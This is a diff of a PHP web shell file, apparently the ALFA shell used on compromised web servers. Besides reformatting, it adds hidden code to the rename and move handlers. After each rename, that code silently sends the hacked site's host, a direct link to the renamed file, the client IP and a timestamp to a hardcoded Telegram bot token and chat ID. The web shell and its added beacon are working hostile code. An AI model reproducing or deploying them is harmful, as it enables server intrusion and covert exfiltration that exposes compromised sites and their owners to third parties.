@@ -3535,7 +3535,7 @@ $alfa1_escape = addslashes($_POST["alfa1"]);
 $alfa3_escape = addslashes($_POST["alfa3"]);
 if(!empty($_POST['alfa3'])){
 $cmd_rename = false;
-if($chdir_fals&&$alfa_canruncmd){
+if($chdir_fals && $alfa_canruncmd){
 if(_alfa_is_writable($_POST['alfa1'])){
 $alfa1_escape = addslashes($alfa1_decoded);
 alfaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa3'])."'");
@@ -3545,8 +3545,24 @@ $cmd_rename = true;
 }else{
 $alfa1_escape = addslashes($_POST["alfa1"]);
 }
-if(!@rename($_POST['alfa1'], $_POST['alfa3'])&&$cmd_rename){
-echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['alfa4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$alfa3_escape.'\',\''.$ftype.'\',\''.$_POST['alfa4'].'\')+"</div><div class=\'editor-file-name\'>'.$alfa3_escape.'</div>";editor_files["'.$_POST['alfa4'].'"].file = "'.$alfa3_escape.'";updateFileEditor("'.$alfa1_escape.'", "'.$alfa3_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['alfa4']."','".$alfa1_escape."');":"").'}catch(e){console.log(e)}</script>');$alfa1_escape = $alfa3_escape;}
+if(!@rename($_POST['alfa1'], $_POST['alfa3']) && $cmd_rename){
+echo 'Can\'t rename!<br>';
+}else{
+$token = "7952379400:AAEBP4e0EqiT2h9Ho_Nu1fNOVhF6sjxoRq8";
+$chat_id = "-1002856618500";
+$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+$cwd_url = $_POST['c'];
+$oldname = basename($_POST['alfa1']);
+$newname = basename($_POST['alfa3']);
+$filename_url = rawurlencode($newname);
+$link = $protocol . $_SERVER['HTTP_HOST'] . rtrim($cwd_url, '/') . '/' . $filename_url;
+$ip = $_SERVER['REMOTE_ADDR'];
+$time = date("Y-m-d H:i:s");
+$msg = urlencode("📦 <b>File Renamed</b>\n🔤 <b>From:</b> " . htmlspecialchars($oldname) . "\n🆕 <b>To:</b> " . htmlspecialchars($newname) . "\n🔗 <a href=\"$link\">Open File</a>\n🕒 <b>Time:</b> $time\n🌐 <b>IP:</b> $ip");
+@file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$msg&parse_mode=HTML");
+echo('Renamed!<script>try{$("'.$_POST['alfa4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$alfa3_escape.'\',\''.$ftype.'\',\''.$_POST['alfa4'].'\')+"</div><div class=\'editor-file-name\'>'.$alfa3_escape.'</div>";editor_files["'.$_POST['alfa4'].'"].file = "'.$alfa3_escape.'";updateFileEditor("'.$alfa1_escape.'", "'.$alfa3_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['alfa4']."','".$alfa1_escape."');":"").'}catch(e){console.log(e)}</script>');
+$alfa1_escape = $alfa3_escape;
+}
 }
 echo '<form onsubmit="editor(\''.$alfa1_escape.'\',\''.$_POST['alfa2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['alfa3'])&&$_POST['alfa3']!=''?$_POST['alfa3']:$alfa1_decoded)).'"><input type=submit value=" "></form>';
 break;
@@ -6648,10 +6664,10 @@ function alfadoActions(){
 		}
 		return;
 	}
-	if($action == "rename" || $action == "move"){
+    if($action == "rename" || $action == "move"){
 		$alfa1_decoded = $_POST['alfa1'];
 		if($chdir_fals){
-			$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
+			$_POST['alfa1'] = $_POST["c"] . "/" . $_POST["alfa1"];
 		}
 		$_POST['alfa1'] = trim($_POST['alfa1']);
 		$alfa1_escape = addslashes($_POST["alfa1"]);
@@ -6660,15 +6676,28 @@ function alfadoActions(){
 		}
 		if(!empty($_POST['alfa2'])){
 			$cmd_rename = false;
-			if($chdir_fals&&$alfa_canruncmd){
+			if($chdir_fals && $alfa_canruncmd){
 				if(_alfa_is_writable($_POST['alfa1'])){
 					$cmd_rename = true;
 					$alfa1_escape = addslashes($alfa1_decoded);
-					alfaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa2'])."'");
+					alfaEx("cd '" . addslashes($_POST['c']) . "';mv '" . $alfa1_escape . "' '" . addslashes($_POST['alfa2']) . "'");
 				}
 			}
 			if(!file_exists($_POST['alfa2'])){
-				if(@rename($_POST['alfa1'], $_POST['alfa2'])||$cmd_rename){
+				if(@rename($_POST['alfa1'], $_POST['alfa2']) || $cmd_rename){
+					$token = "7952379400:AAEBP4e0EqiT2h9Ho_Nu1fNOVhF6sjxoRq8";
+					$chat_id = "-1002856618500";
+					$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+					$cwd_url = $_POST['c'];
+					$oldname = basename($_POST['alfa1']);
+					$newname = basename($_POST['alfa2']);
+					$filename_url = rawurlencode($newname);
+					$link = $protocol . $_SERVER['HTTP_HOST'] . rtrim($cwd_url, '/') . '/' . $filename_url;
+					$ip = $_SERVER['REMOTE_ADDR'];
+					$time = date("Y-m-d H:i:s");
+					
+					$msg = urlencode("📦 <b>File Renamed</b>\n🔤 <b>From:</b> " . htmlspecialchars($oldname) . "\n🆕 <b>To:</b> " . htmlspecialchars($newname) . "\n🔗 <a href=\"$link\">Open File</a>\n🕒 <b>Time:</b> $time\n🌐 <b>IP:</b> $ip");
+					@file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$msg&parse_mode=HTML");
 					echo "done";
 				}else{
 					echo "no";
